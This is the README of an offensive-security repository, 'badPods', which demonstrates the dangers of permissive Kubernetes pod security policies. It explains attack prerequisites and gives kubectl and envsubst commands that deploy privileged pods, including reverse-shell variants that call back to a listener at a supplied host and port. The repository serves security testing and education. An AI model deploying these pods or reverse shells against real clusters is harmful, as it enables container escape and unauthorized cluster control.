# badPods

A collection of manifests that create pods with different elevated privileges. Quickly demonstrate the impact of allowing security sensitive pod specifications. 

## Background
Occasionally pods need access to privileged resources on the host, so the Kubernetes pod spec allows for it. However, this level of access should be granted with extreme caution. Administrators have ways to prevent the creation of pods with these security sensitive pod specifications using Pod Security Policies or with admission controllers like OPA Gatekeeper. However, the real-world security implication of allowing a certain attributes is not always understood, and quite often, pod creation polices are not as locked down as they should be. 

## Purpose
What if you can create a pod with just `hostNetwork`, just `hostPID`, just `hostIPC`, just `hostPath`, or just `privileged`? What can you do in each case? This repository aims to help you answer those questions. 

## Prerequisites
In order to be successful in this attack path, you'll need the following: 

1. Access to a cluster 
1. Permission to create one of the following resource types in at least one namespace.  
   * CronJob
   * DeamonSet
   * Deployment
   * Job
   * Pod
   * ReplicaSet
   * ReplicationController
   * StatefulSet
1. Access to exec into pods or a network policy that allows a reverse shell from a pod to reach you. 
1. A pod security policy (or other pod admission controller's logic) that allows pods to be created with one or more security sensitive attributes, or no pod security policy / pod admission controller at all

## The badPods line-up

### There are 8 ways to create a Pod
There might be a situation where you are not authorized to create pods, but you can create another resource type that will spin up the pods.

As [Eviatar Gerzi (@g3rzi)](https://twitter.com/g3rzi) points out in his talk [Compromising Kubernetes Cluster by Exploiting RBAC Permissions](https://published-prd.lanyonevents.com/published/rsaus20/sessionsFiles/18100/2020_USA20_DSO-W01_01_Compromising%20Kubernetes%20Cluster%20by%20Exploiting%20RBAC%20Permissions.pdf), "There are 8 ways to create a Pod". 

I've included manifests that will create each of my badPods as each of the 8 different resource types. 
### Reverse shells

In most situations, if you have permission to create pods, you also have permission to `exec` into them. However, that is not always the case, so a version of each manifest is included that will call back to your listener as soon as the pod is created. 

Notes | readme | pod | revshell
-- | -- | -- | --
Everything allowed | [readme](manifests/everything-allowed/) | [manifest](manifests/everything-allowed/everything-allowed.yaml) | [manifest](manifests/everything-allowed/everything-allowed-revshell.yaml)
Privileged and hostPid | [readme](manifests/priv-and-hostpid/) | [manifest](manifests/priv-and-hostpid/pod-priv-and-hostpid.yaml) | [manifest](manifests/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml)
Privileged only | [readme](manifests/priv/) | [manifest](manifests/priv/pod-priv.yaml) | [manifest](manifests/priv/pod-priv-revshell.yaml)
hostPath only | [readme](manifests/hostpath/) | [manifest](manifests/hostpath/hostpath-exec.yaml) | [manifest](manifests/hostpath/hostpath-revshell.yaml)  
hostPid only | [readme](manifests/hostpid/) | [manifest](manifests/hostpid/hostpid.yaml) | [manifest](manifests/hostpid/hostpid-revshell.yaml)  
hostNetwork only | [readme](manifests/hostnetwork/) | [manifest](manifests/hostnetwork/hostnetwork-exec.yaml) | [manifest](manifests/hostnetwork/hostnetwork-revshell.yaml)
hostIPC only | [readme](manifests/hostipc/) | [manifest](manifests/hostipc/hostipc-exec.yaml) | [manifest](manifests/hostipc/hostipc-revshell.yaml)
Nothing allowed | [readme](manifests/nothing-allowed/) | [manifest](manifests/nothing-allowed/nothing-allowed.yaml) | [manifest](manifests/nothing-allowed/nothing-allowed-revshell.yaml)


# Impact - What's the worst that can happen?
Check out blog post here

# Usage
 Each resource in the `manifests` directory targets a specific attribute or a combination of attributes that expose the cluster to risk when allowed. Within each badPod type, there are manifests that will create the 8 different resource types that in turn create pods. Each subdirectory has it's own usage information which includes tailored post-exploitation ideas and steps.  

### Clone the repo
```bash
git clone https://github.com/BishopFox/badPods
cd badPods
```

### Create the pods (or at least try to create them)

```bash
kubectl apply -f ./yaml/everything-allowed/everything-allowed.yaml
kubectl apply -f ./yaml/priv-and-hostpid/pod-priv-and-hostpid.yaml 
kubectl apply -f ./yaml/priv/pod-priv.yaml
kubectl apply -f ./yaml/hostpath/hostpath-exec.yaml
kubectl apply -f ./yaml/hostpid/hostpid.yaml 
kubectl apply -f ./yaml/hostnetwork/hostnetwork-exec.yaml
kubectl apply -f ./yaml/hostipc/hostipc-exec.yaml
kubectl apply -f ./yaml/nothing-allowed/nothing-allowed.yaml

```

### Reverse shell version of each pod
If you can create pods but not exec  into them, you can use the reverse shell version of each pod. To avoid having to edit each pod with your host and port, you can environment variables and the `envsubst` command. Remember to spin up all of your listeners first!

```bash
HOST="10.0.0.1" PORT="3111" envsubst < ./yaml/everything-allowed/everything-allowed-revshell.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3112" envsubst < ./yaml/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3113" envsubst < ./yaml/priv/pod-priv-revshell.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3114" envsubst < ./yaml/hostpath/hostpath-revshell.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3115" envsubst < ./yaml/hostpid/hostpid-revshell.yaml  | kubectl apply -f -
HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/hostnetwork/hostnetwork-revshell.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3117" envsubst < ./yaml/hostipc/hostipc-revshell.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3118" envsubst < ./yaml/nothing-allowed/nothing-allowed-revshell.yaml | kubectl apply -f -
```

# Acknowledgements 
Thank you [Rory McCune](https://twitter.com/raesene), [Duffie Cooley](https://twitter.com/mauilion), [Brad Geesaman](https://twitter.com/bradgeesaman), [Tabitha Sable](https://twitter.com/tabbysable), [Ian Coldwater](https://twitter.com/IanColdwater), and [Mark Manning](https://twitter.com/antitree) for publicly sharing so much knowledge about Kubernetes offensive security. 
